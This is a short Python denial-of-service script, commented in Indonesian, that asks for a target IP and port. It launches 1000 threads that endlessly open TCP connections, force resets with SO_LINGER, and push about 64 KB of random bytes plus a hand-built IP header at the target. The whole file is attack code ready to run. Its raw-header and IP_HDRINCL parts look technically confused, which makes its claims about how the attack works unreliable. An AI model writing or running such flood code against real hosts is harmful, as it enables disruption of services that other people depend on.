import socket
import threading
import struct
import random

target_ip = str(input("IP : "))
target_port = int(input("PORT : "))

# Fungsi untuk melakukan serangan rapid reset dengan memanfaatkan IP_HDRINCL
def big_data_rapid_reset_ip_hdrincl():
    p = random._urandom(65507)
    while True:
        ip_header = struct.pack('!BBHHHBBH4s4s', 
                                69, # Version & IHL
                                0, # Type of Service
                                40, # Total Length
                                random.randint(1, 65535), # Identification dengan nilai acak
                                0, # Flags & Fragment Offset
                                64, # TTL
                                socket.IPPROTO_TCP, # Protocol
                                0, # Header Checksum
                                socket.inet_aton(target_ip), # Source IP
                                socket.inet_aton(target_ip) # Destination IP
                                ) # Menambahkan random bytes ke dalam paket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target_ip, target_port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.send(ip_header)
            s.send(p)
        except socket.error:
            pass

# Membuat dan memulai thread untuk serangan big data rapid reset dengan IP_HDRINCL
for i in range(1000):
    thread = threading.Thread(target=big_data_rapid_reset_ip_hdrincl)
    thread.start()
